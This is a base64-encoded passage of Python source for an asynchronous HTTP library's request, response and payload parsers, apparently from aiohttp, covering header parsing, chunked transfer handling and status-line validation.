JcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbWl0PXNlbGYuX2xpbWl0LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXlsb2FkX3BhcnNlciA9IEh0dHBQYXlsb2FkUGFyc2VyKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXlsb2FkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZW5ndGg9bGVuZ3RoLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua2VkPW1zZy5jaHVua2VkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q9bWV0aG9kLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wcmVzc2lvbj1tc2cuY29tcHJlc3Npb24sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvZGU9c2VsZi5jb2RlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWFkYWxsPVRydWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlX3dpdGhfYm9keT1zZWxmLnJlc3BvbnNlX3dpdGhfYm9keSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0b19kZWNvbXByZXNzPXNlbGYuX2F1dG9fZGVjb21wcmVzcyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHBheWxvYWRfcGFyc2VyLmRvbmU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyID0gcGF5bG9hZF9wYXJzZXJcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bG9hZCA9IEVNUFRZX1BBWUxPQURcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VzLmFwcGVuZCgobXNnLCBwYXlsb2FkKSlcclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fdGFpbCA9IGRhdGFbc3RhcnRfcG9zOl1cclxuICAgICAgICAgICAgICAgICAgICBkYXRhID0gRU1QVFlcclxuICAgICAgICAgICAgICAgICAgICBicmVha1xyXG5cclxuICAgICAgICAgICAgIyBubyBwYXJzZXIsIGp1c3Qgc3RvcmVcclxuICAgICAgICAgICAgZWxpZiBzZWxmLl9wYXlsb2FkX3BhcnNlciBpcyBOb25lIGFuZCBzZWxmLl91cGdyYWRlZDpcclxuICAgICAgICAgICAgICAgIGFzc2VydCBub3Qgc2VsZi5fbGluZXNcclxuICAgICAgICAgICAgICAgIGJyZWFrXHJcblxyXG4gICAgICAgICAgICAjIGZlZWQgcGF5bG9hZFxyXG4gICAgICAgICAgICBlbGlmIGRhdGEgYW5kIHN0YXJ0X3BvcyA8IGRhdGFfbGVuOlxyXG4gICAgICAgICAgICAgICAgYXNzZXJ0IG5vdCBzZWxmLl9saW5lc1xyXG4gICAgICAgICAgICAgICAgYXNzZXJ0IHNlbGYuX3BheWxvYWRfcGFyc2VyIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgZW9mLCBkYXRhID0gc2VsZi5fcGF5bG9hZF9wYXJzZXIuZmVlZF9kYXRhKGRhdGFbc3RhcnRfcG9zOl0pXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgQmFzZUV4Y2VwdGlvbiBhcyBleGM6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5wYXlsb2FkX2V4Y2VwdGlvbiBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fcGF5bG9hZF9wYXJzZXIucGF5bG9hZC5zZXRfZXhjZXB0aW9uKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5wYXlsb2FkX2V4Y2VwdGlvbihzdHIoZXhjKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyLnBheWxvYWQuc2V0X2V4Y2VwdGlvbihleGMpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgIGVvZiA9IFRydWVcclxuICAgICAgICAgICAgICAgICAgICBkYXRhID0gYiIiXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgZW9mOlxyXG4gICAgICAgICAgICAgICAgICAgIHN0YXJ0X3BvcyA9IDBcclxuICAgICAgICAgICAgICAgICAgICBkYXRhX2xlbiA9IGxlbihkYXRhKVxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyID0gTm9uZVxyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBicmVha1xyXG5cclxuICAgICAgICBpZiBkYXRhIGFuZCBzdGFydF9wb3MgPCBkYXRhX2xlbjpcclxuICAgICAgICAgICAgZGF0YSA9IGRhdGFbc3RhcnRfcG9zOl1cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBkYXRhID0gRU1QVFlcclxuXHJcbiAgICAgICAgcmV0dXJuIG1lc3NhZ2VzLCBzZWxmLl91cGdyYWRlZCwgZGF0YVxyXG5cclxuICAgIGRlZiBwYXJzZV9oZWFkZXJzKFxyXG4gICAgICAgIHNlbGYsIGxpbmVzOiBMaXN0W2J5dGVzXVxyXG4gICAgKSAtPiBUdXBsZVtcclxuICAgICAgICAiQ0lNdWx0aURpY3RQcm94eVtzdHJdIiwgUmF3SGVhZGVycywgT3B0aW9uYWxbYm9vbF0sIE9wdGlvbmFsW3N0cl0sIGJvb2wsIGJvb2xcclxuICAgIF06XHJcbiAgICAgICAgIiIiUGFyc2VzIFJGQyA1MzIyIGhlYWRlcnMgZnJvbSBhIHN0cmVhbS5cclxuXHJcbiAgICAgICAgTGluZSBjb250aW51YXRpb25zIGFyZSBzdXBwb3J0ZWQuIFJldHVybnMgbGlzdCBvZiBoZWFkZXIgbmFtZVxyXG4gICAgICAgIGFuZCB2YWx1ZSBwYWlycy4gSGVhZGVyIG5hbWUgaXMgaW4gdXBwZXIgY2FzZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICBoZWFkZXJzLCByYXdfaGVhZGVycyA9IHNlbGYuX2hlYWRlcnNfcGFyc2VyLnBhcnNlX2hlYWRlcnMobGluZXMpXHJcbiAgICAgICAgY2xvc2VfY29ubiA9IE5vbmVcclxuICAgICAgICBlbmNvZGluZyA9IE5vbmVcclxuICAgICAgICB1cGdyYWRlID0gRmFsc2VcclxuICAgICAgICBjaHVua2VkID0gRmFsc2VcclxuXHJcbiAgICAgICAgIyBrZWVwLWFsaXZlXHJcbiAgICAgICAgY29ubiA9IGhlYWRlcnMuZ2V0KGhkcnMuQ09OTkVDVElPTilcclxuICAgICAgICBpZiBjb25uOlxyXG4gICAgICAgICAgICB2ID0gY29ubi5sb3dlcigpXHJcbiAgICAgICAgICAgIGlmIHYgPT0gImNsb3NlIjpcclxuICAgICAgICAgICAgICAgIGNsb3NlX2Nvbm4gPSBUcnVlXHJcbiAgICAgICAgICAgIGVsaWYgdiA9PSAia2VlcC1hbGl2ZSI6XHJcbiAgICAgICAgICAgICAgICBjbG9zZV9jb25uID0gRmFsc2VcclxuICAgICAgICAgICAgZWxpZiB2ID09ICJ1cGdyYWRlIjpcclxuICAgICAgICAgICAgICAgIHVwZ3JhZGUgPSBUcnVlXHJcblxyXG4gICAgICAgICMgZW5jb2RpbmdcclxuICAgICAgICBlbmMgPSBoZWFkZXJzLmdldChoZHJzLkNPTlRFTlRfRU5DT0RJTkcpXHJcbiAgICAgICAgaWYgZW5jOlxyXG4gICAgICAgICAgICBlbmMgPSBlbmMubG93ZXIoKVxyXG4gICAgICAgICAgICBpZiBlbmMgaW4gKCJnemlwIiwgImRlZmxhdGUiLCAiYnIiKTpcclxuICAgICAgICAgICAgICAgIGVuY29kaW5nID0gZW5jXHJcblxyXG4gICAgICAgICMgY2h1bmtpbmdcclxuICAgICAgICB0ZSA9IGhlYWRlcnMuZ2V0KGhkcnMuVFJBTlNGRVJfRU5DT0RJTkcpXHJcbiAgICAgICAgaWYgdGUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGlmICJjaHVua2VkIiA9PSB0ZS5sb3dlcigpOlxyXG4gICAgICAgICAgICAgICAgY2h1bmtlZCA9IFRydWVcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIEJhZEh0dHBNZXNzYWdlKCJSZXF1ZXN0IGhhcyBpbnZhbGlkIGBUcmFuc2Zlci1FbmNvZGluZ2AiKVxyXG5cclxuICAgICAgICAgICAgaWYgaGRycy5DT05URU5UX0xFTkdUSCBpbiBoZWFkZXJzOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgQmFkSHR0cE1lc3NhZ2UoXHJcbiAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtTGVuZ3RoIGNhblwndCBiZSBwcmVzZW50IHdpdGggVHJhbnNmZXItRW5jb2RpbmciLFxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gKGhlYWRlcnMsIHJhd19oZWFkZXJzLCBjbG9zZV9jb25uLCBlbmNvZGluZywgdXBncmFkZSwgY2h1bmtlZClcclxuXHJcbiAgICBkZWYgc2V0X3VwZ3JhZGVkKHNlbGYsIHZhbDogYm9vbCkgLT4gTm9uZTpcclxuICAgICAgICAiIiJTZXQgY29ubmVjdGlvbiB1cGdyYWRlZCAodG8gd2Vic29ja2V0KSBtb2RlLlxyXG5cclxuICAgICAgICA6cGFyYW0gYm9vbCB2YWw6IG5ldyBzdGF0ZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICBzZWxmLl91cGdyYWRlZCA9IHZhbFxyXG5cclxuXHJcbmNsYXNzIEh0dHBSZXF1ZXN0UGFyc2VyKEh0dHBQYXJzZXJbUmF3UmVxdWVzdE1lc3NhZ2VdKTpcclxuICAgICIiIlJlYWQgcmVxdWVzdCBzdGF0dXMgbGluZS5cclxuXHJcbiAgICBFeGNlcHRpb24gLmh0dHBfZXhjZXB0aW9ucy5CYWRTdGF0dXNMaW5lXHJcbiAgICBjb3VsZCBiZSByYWlzZWQgaW4gY2FzZSBvZiBhbnkgZXJyb3JzIGluIHN0YXR1cyBsaW5lLlxyXG4gICAgUmV0dXJucyBSYXdSZXF1ZXN0TWVzc2FnZS5cclxuICAgICIiIlxyXG5cclxuICAgIGRlZiBwYXJzZV9tZXNzYWdlKHNlbGYsIGxpbmVzOiBMaXN0W2J5dGVzXSkgLT4gUmF3UmVxdWVzdE1lc3NhZ2U6XHJcbiAgICAgICAgIyByZXF1ZXN0IGxpbmVcclxuICAgICAgICBsaW5lID0gbGluZXNbMF0uZGVjb2RlKCJ1dGYtOCIsICJzdXJyb2dhdGVlc2NhcGUiKVxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgbWV0aG9kLCBwYXRoLCB2ZXJzaW9uID0gbGluZS5zcGxpdChOb25lLCAyKVxyXG4gICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxyXG4gICAgICAgICAgICByYWlzZSBCYWRTdGF0dXNMaW5lKGxpbmUpIGZyb20gTm9uZVxyXG5cclxuICAgICAgICBpZiBsZW4ocGF0aCkgPiBzZWxmLm1heF9saW5lX3NpemU6XHJcbiAgICAgICAgICAgIHJhaXNlIExpbmVUb29Mb25nKFxyXG4gICAgICAgICAgICAgICAgIlN0YXR1cyBsaW5lIGlzIHRvbyBsb25nIiwgc3RyKHNlbGYubWF4X2xpbmVfc2l6ZSksIHN0cihsZW4ocGF0aCkpXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgcGF0aF9wYXJ0LCBfaGFzaF9zZXBhcmF0b3IsIHVybF9mcmFnbWVudCA9IHBhdGgucGFydGl0aW9uKCIjIilcclxuICAgICAgICBwYXRoX3BhcnQsIF9xdWVzdGlvbl9tYXJrX3NlcGFyYXRvciwgcXNfcGFydCA9IHBhdGhfcGFydC5wYXJ0aXRpb24oIj8iKVxyXG5cclxuICAgICAgICAjIG1ldGhvZFxyXG4gICAgICAgIGlmIG5vdCBNRVRIUkUubWF0Y2gobWV0aG9kKTpcclxuICAgICAgICAgICAgcmFpc2UgQmFkU3RhdHVzTGluZShtZXRob2QpXHJcblxyXG4gICAgICAgICMgdmVyc2lvblxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgdmVyc2lvbi5zdGFydHN3aXRoKCJIVFRQLyIpOlxyXG4gICAgICAgICAgICAgICAgbjEsIG4yID0gdmVyc2lvbls1Ol0uc3BsaXQoIi4iLCAxKVxyXG4gICAgICAgICAgICAgICAgdmVyc2lvbl9vID0gSHR0cFZlcnNpb24oaW50KG4xKSwgaW50KG4yKSlcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIEJhZFN0YXR1c0xpbmUodmVyc2lvbilcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uOlxyXG4gICAgICAgICAgICByYWlzZSBCYWRTdGF0dXNMaW5lKHZlcnNpb24pXHJcblxyXG4gICAgICAgICMgcmVhZCBoZWFkZXJzXHJcbiAgICAgICAgKFxyXG4gICAgICAgICAgICBoZWFkZXJzLFxyXG4gICAgICAgICAgICByYXdfaGVhZGVycyxcclxuICAgICAgICAgICAgY2xvc2UsXHJcbiAgICAgICAgICAgIGNvbXByZXNzaW9uLFxyXG4gICAgICAgICAgICB1cGdyYWRlLFxyXG4gICAgICAgICAgICBjaHVua2VkLFxyXG4gICAgICAgICkgPSBzZWxmLnBhcnNlX2hlYWRlcnMobGluZXMpXHJcblxyXG4gICAgICAgIGlmIGNsb3NlIGlzIE5vbmU6ICAjIHRoZW4gdGhlIGhlYWRlcnMgd2VyZW5cJ3Qgc2V0IGluIHRoZSByZXF1ZXN0XHJcbiAgICAgICAgICAgIGlmIHZlcnNpb25fbyA8PSBIdHRwVmVyc2lvbjEwOiAgIyBIVFRQIDEuMCBtdXN0IGFza3MgdG8gbm90IGNsb3NlXHJcbiAgICAgICAgICAgICAgICBjbG9zZSA9IFRydWVcclxuICAgICAgICAgICAgZWxzZTogICMgSFRUUCAxLjEgbXVzdCBhc2sgdG8gY2xvc2UuXHJcbiAgICAgICAgICAgICAgICBjbG9zZSA9IEZhbHNlXHJcblxyXG4gICAgICAgIHJldHVybiBSYXdSZXF1ZXN0TWVzc2FnZShcclxuICAgICAgICAgICAgbWV0aG9kLFxyXG4gICAgICAgICAgICBwYXRoLFxyXG4gICAgICAgICAgICB2ZXJzaW9uX28sXHJcbiAgICAgICAgICAgIGhlYWRlcnMsXHJcbiAgICAgICAgICAgIHJhd19oZWFkZXJzLFxyXG4gICAgICAgICAgICBjbG9zZSxcclxuICAgICAgICAgICAgY29tcHJlc3Npb24sXHJcbiAgICAgICAgICAgIHVwZ3JhZGUsXHJcbiAgICAgICAgICAgIGNodW5rZWQsXHJcbiAgICAgICAgICAgICMgTk9URTogYHlhcmwuVVJMLmJ1aWxkKClgIGlzIHVzZWQgdG8gbWltaWMgd2hhdCB0aGUgQ3l0aG9uLWJhc2VkXHJcbiAgICAgICAgICAgICMgTk9URTogcGFyc2VyIGRvZXMsIG90aGVyd2lzZSBpdCByZXN1bHRzIGludG8gdGhlIHNhbWVcclxuICAgICAgICAgICAgIyBOT1RFOiBIVFRQIFJlcXVlc3QtTGluZSBpbnB1dCBwcm9kdWNpbmcgZGlmZmVyZW50XHJcbiAgICAgICAgICAgICMgTk9URTogYHlhcmwuVVJMKClgIG9iamVjdHNcclxuICAgICAgICAgICAgVVJMLmJ1aWxkKFxyXG4gICAgICAgICAgICAgICAgcGF0aD1wYXRoX3BhcnQsXHJcbiAgICAgICAgICAgICAgICBxdWVyeV9zdHJpbmc9cXNfcGFydCxcclxuICAgICAgICAgICAgICAgIGZyYWdtZW50PXVybF9mcmFnbWVudCxcclxuICAgICAgICAgICAgICAgIGVuY29kZWQ9VHJ1ZSxcclxuICAgICAgICAgICAgKSxcclxuICAgICAgICApXHJcblxyXG5cclxuY2xhc3MgSHR0cFJlc3BvbnNlUGFyc2VyKEh0dHBQYXJzZXJbUmF3UmVzcG9uc2VNZXNzYWdlXSk6XHJcbiAgICAiIiJSZWFkIHJlc3BvbnNlIHN0YXR1cyBsaW5lIGFuZCBoZWFkZXJzLlxyXG5cclxuICAgIEJhZFN0YXR1c0xpbmUgY291bGQgYmUgcmFpc2VkIGluIGNhc2Ugb2YgYW55IGVycm9ycyBpbiBzdGF0dXMgbGluZS5cclxuICAgIFJldHVybnMgUmF3UmVzcG9uc2VNZXNzYWdlLlxyXG4gICAgIiIiXHJcblxyXG4gICAgZGVmIHBhcnNlX21lc3NhZ2Uoc2VsZiwgbGluZXM6IExpc3RbYnl0ZXNdKSAtPiBSYXdSZXNwb25zZU1lc3NhZ2U6XHJcbiAgICAgICAgbGluZSA9IGxpbmVzWzBdLmRlY29kZSgidXRmLTgiLCAic3Vycm9nYXRlZXNjYXBlIilcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHZlcnNpb24sIHN0YXR1cyA9IGxpbmUuc3BsaXQoTm9uZSwgMSlcclxuICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjpcclxuICAgICAgICAgICAgcmFpc2UgQmFkU3RhdHVzTGluZShsaW5lKSBmcm9tIE5vbmVcclxuXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBzdGF0dXMsIHJlYXNvbiA9IHN0YXR1cy5zcGxpdChOb25lLCAxKVxyXG4gICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxyXG4gICAgICAgICAgICByZWFzb24gPSAiIlxyXG5cclxuICAgICAgICBpZiBsZW4ocmVhc29uKSA+IHNlbGYubWF4X2xpbmVfc2l6ZTpcclxuICAgICAgICAgICAgcmFpc2UgTGluZVRvb0xvbmcoXHJcbiAgICAgICAgICAgICAgICAiU3RhdHVzIGxpbmUgaXMgdG9vIGxvbmciLCBzdHIoc2VsZi5tYXhfbGluZV9zaXplKSwgc3RyKGxlbihyZWFzb24pKVxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgICMgdmVyc2lvblxyXG4gICAgICAgIG1hdGNoID0gVkVSU1JFLm1hdGNoKHZlcnNpb24pXHJcbiAgICAgICAgaWYgbWF0Y2ggaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgQmFkU3RhdHVzTGluZShsaW5lKVxyXG4gICAgICAgIHZlcnNpb25fbyA9IEh0dHBWZXJzaW9uKGludChtYXRjaC5ncm91cCgxKSksIGludChtYXRjaC5ncm91cCgyKSkpXHJcblxyXG4gICAgICAgICMgVGhlIHN0YXR1cyBjb2RlIGlzIGEgdGhyZWUtZGlnaXQgbnVtYmVyXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBzdGF0dXNfaSA9IGludChzdGF0dXMpXHJcbiAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6XHJcbiAgICAgICAgICAgIHJhaXNlIEJhZFN0YXR1c0xpbmUobGluZSkgZnJvbSBOb25lXHJcblxyXG4gICAgICAgIGlmIHN0YXR1c19pID4gOTk5OlxyXG4gICAgICAgICAgICByYWlzZSBCYWRTdGF0dXNMaW5lKGxpbmUpXHJcblxyXG4gICAgICAgICMgcmVhZCBoZWFkZXJzXHJcbiAgICAgICAgKFxyXG4gICAgICAgICAgICBoZWFkZXJzLFxyXG4gICAgICAgICAgICByYXdfaGVhZGVycyxcclxuICAgICAgICAgICAgY2xvc2UsXHJcbiAgICAgICAgICAgIGNvbXByZXNzaW9uLFxyXG4gICAgICAgICAgICB1cGdyYWRlLFxyXG4gICAgICAgICAgICBjaHVua2VkLFxyXG4gICAgICAgICkgPSBzZWxmLnBhcnNlX2hlYWRlcnMobGluZXMpXHJcblxyXG4gICAgICAgIGlmIGNsb3NlIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGNsb3NlID0gdmVyc2lvbl9vIDw9IEh0dHBWZXJzaW9uMTBcclxuXHJcbiAgICAgICAgcmV0dXJuIFJhd1Jlc3BvbnNlTWVzc2FnZShcclxuICAgICAgICAgICAgdmVyc2lvbl9vLFxyXG4gICAgICAgICAgICBzdGF0dXNfaSxcclxuICAgICAgICAgICAgcmVhc29uLnN0cmlwKCksXHJcbiAgICAgICAgICAgIGhlYWRlcnMsXHJcbiAgICAgICAgICAgIHJhd19oZWFkZXJzLFxyXG4gICAgICAgICAgICBjbG9zZSxcclxuICAgICAgICAgICAgY29tcHJlc3Npb24sXHJcbiAgICAgICAgICAgIHVwZ3JhZGUsXHJcbiAgICAgICAgICAgIGNodW5rZWQsXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmNsYXNzIEh0dHBQYXlsb2FkUGFyc2VyOlxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgcGF5bG9hZDogU3RyZWFtUmVhZGVyLFxyXG4gICAgICAgIGxlbmd0aDogT3B0aW9uYWxbaW50XSA9IE5vbmUsXHJcbiAgICAgICAgY2h1bmtlZDogYm9vbCA9IEZhbHNlLFxyXG4gICAgICAgIGNvbXByZXNzaW9uOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBjb2RlOiBPcHRpb25hbFtpbnRdID0gTm9uZSxcclxuICAgICAgICBtZXRob2Q6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIHJlYWRhbGw6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICByZXNwb25zZV93aXRoX2JvZHk6IGJvb2wgPSBUcnVlLFxyXG4gICAgICAgIGF1dG9fZGVjb21wcmVzczogYm9vbCA9IFRydWUsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fbGVuZ3RoID0gMFxyXG4gICAgICAgIHNlbGYuX3R5cGUgPSBQYXJzZVN0YXRlLlBBUlNFX05PTkVcclxuICAgICAgICBzZWxmLl9jaHVuayA9IENodW5rU3RhdGUuUEFSU0VfQ0hVTktFRF9TSVpFXHJcbiAgICAgICAgc2VsZi5fY2h1bmtfc2l6ZSA9IDBcclxuICAgICAgICBzZWxmLl9jaHVua190YWlsID0gYiIiXHJcbiAgICAgICAgc2VsZi5fYXV0b19kZWNvbXByZXNzID0gYXV0b19kZWNvbXByZXNzXHJcbiAgICAgICAgc2VsZi5kb25lID0gRmFsc2VcclxuXHJcbiAgICAgICAgIyBwYXlsb2FkIGRlY29tcHJlc3Npb24gd3JhcHBlclxyXG4gICAgICAgIGlmIHJlc3BvbnNlX3dpdGhfYm9keSBhbmQgY29tcHJlc3Npb24gYW5kIHNlbGYuX2F1dG9fZGVjb21wcmVzczpcclxuICAgICAgICAgICAgcmVhbF9wYXlsb2FkID0gRGVmbGF0ZUJ1ZmZlcihcclxuICAgICAgICAgICAgICAgIHBheWxvYWQsIGNvbXByZXNzaW9uXHJcbiAgICAgICAgICAgICkgICMgdHlwZTogVW5pb25bU3RyZWFtUmVhZGVyLCBEZWZsYXRlQnVmZmVyXVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJlYWxfcGF5bG9hZCA9IHBheWxvYWRcclxuXHJcbiAgICAgICAgIyBwYXlsb2FkIHBhcnNlclxyXG4gICAgICAgIGlmIG5vdCByZXNwb25zZV93aXRoX2JvZHk6XHJcbiAgICAgICAgICAgICMgZG9uXCd0IHBhcnNlIHBheWxvYWQgaWYgaXRcJ3Mgbm90IGV4cGVjdGVkIHRvIGJlIHJlY2VpdmVkXHJcbiAgICAgICAgICAgIHNlbGYuX3R5cGUgPSBQYXJzZVN0YXRlLlBBUlNFX05PTkVcclxuICAgICAgICAgICAgcmVhbF9wYXlsb2FkLmZlZWRfZW9mKClcclxuICAgICAgICAgICAgc2VsZi5kb25lID0gVHJ1ZVxyXG5cclxuICAgICAgICBlbGlmIGNodW5rZWQ6XHJcbiAgICAgICAgICAgIHNlbGYuX3R5cGUgPSBQYXJzZVN0YXRlLlBBUlNFX0NIVU5LRURcclxuICAgICAgICBlbGlmIGxlbmd0aCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fdHlwZSA9IFBhcnNlU3RhdGUuUEFSU0VfTEVOR1RIXHJcbiAgICAgICAgICAgIHNlbGYuX2xlbmd0aCA9IGxlbmd0aFxyXG4gICAgICAgICAgICBpZiBzZWxmLl9sZW5ndGggPT0gMDpcclxuICAgICAgICAgICAgICAgIHJlYWxfcGF5bG9hZC5mZWVkX2VvZigpXHJcbiAgICAgICAgICAgICAgICBzZWxmLmRvbmUgPSBUcnVlXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgaWYgcmVhZGFsbCBhbmQgY29kZSAhPSAyMDQ6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl90eXBlID0gUGFyc2VTdGF0ZS5QQVJTRV9VTlRJTF9FT0ZcclxuICAgICAgICAgICAgZWxpZiBtZXRob2QgaW4gKCJQVVQiLCAiUE9TVCIpOlxyXG4gICAgICAgICAgICAgICAgaW50ZXJuYWxfbG9nZ2VyLndhcm5pbmcoICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgICAgICAgICAgICAgICAgICAiQ29udGVudC1MZW5ndGggb3IgVHJhbnNmZXItRW5jb2RpbmcgaGVhZGVyIGlzIHJlcXVpcmVkIlxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgc2VsZi5fdHlwZSA9IFBhcnNlU3RhdGUuUEFSU0VfTk9ORVxyXG4gICAgICAgICAgICAgICAgcmVhbF9wYXlsb2FkLmZlZWRfZW9mKClcclxuICAgICAgICAgICAgICAgIHNlbGYuZG9uZSA9IFRydWVcclxuXHJcbiAgICAgICAgc2VsZi5wYXlsb2FkID0gcmVhbF9wYXlsb2FkXHJcblxyXG4gICAgZGVmIGZlZWRfZW9mKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fdHlwZSA9PSBQYXJzZVN0YXRlLlBBUlNFX1VOVElMX0VPRjpcclxuICAgICAgICAgICAgc2VsZi5wYXlsb2FkLmZlZWRfZW9mKClcclxuICAgICAgICBlbGlmIHNlbGYuX3R5cGUgPT0gUGFyc2VTdGF0ZS5QQVJTRV9MRU5HVEg6XHJcbiAgICAgICAgICAgIHJhaXNlIENvbnRlbnRMZW5ndGhFcnJvcihcclxuICAgICAgICAgICAgICAgICJOb3QgZW5vdWdoIGRhdGEgZm9yIHNhdGlzZnkgY29udGVudCBsZW5ndGggaGVhZGVyLiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsaWYgc2VsZi5fdHlwZSA9PSBQYXJzZVN0YXRlLlBBUlNFX0NIVU5LRUQ6XHJcbiAgICAgICAgICAgIHJhaXNlIFRyYW5zZmVyRW5jb2RpbmdFcnJvcihcclxuICAgICAgICAgICAgICAgICJOb3QgZW5vdWdoIGRhdGEgZm9yIHNhdGlzZnkgdHJhbnNmZXIgbGVuZ3RoIGhlYWRlci4iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICBkZWYgZmVlZF9kYXRhKFxyXG4gICAgICAgIHNlbGYsIGNodW5rOiBieXRlcywgU0VQOiBieXRlcyA9IGIiXFxyXFxuIiwgQ0hVTktfRVhUOiBieXRlcyA9IGIiOyJcclxuICAgICkgLT4gVHVwbGVbYm9vbCwgYnl0ZXNdOlxyXG4gICAgICAgICMgUmVhZCBzcGVjaWZpZWQgYW1vdW50IG9mIGJ5dGVzXHJcbiAgICAgICAgaWYgc2VsZi5fdHlwZSA9PSBQYXJzZVN0YXRlLlBBUlNFX0xFTkdUSDpcclxuICAgICAgICAgICAgcmVxdWlyZWQgPSBzZWxmLl9sZW5ndGhcclxuICAgICAgICAgICAgY2h1bmtfbGVuID0gbGVuKGNodW5rKVxyXG5cclxuICAgICAgICAgICAgaWYgcmVxdWlyZWQgPj0gY2h1bmtfbGVuOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fbGVuZ3RoID0gcmVxdWlyZWQgLSBjaHVua19sZW5cclxuICAgICAgICAgICAgICAgIHNlbGYucGF5bG9hZC5mZWVkX2RhdGEoY2h1bmssIGNodW5rX2xlbilcclxuICAgICAgICAgICAgICAgIGlmIHNlbGYuX2xlbmd0aCA9PSAwOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYucGF5bG9hZC5mZWVkX2VvZigpXHJcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFRydWUsIGIiIlxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fbGVuZ3RoID0gMFxyXG4gICAgICAgICAgICAgICAgc2VsZi5wYXlsb2FkLmZlZWRfZGF0YShjaHVua1s6cmVxdWlyZWRdLCByZXF1aXJlZClcclxuICAgICAgICAgICAgICAgIHNlbGYucGF5bG9hZC5mZWVkX2VvZigpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZSwgY2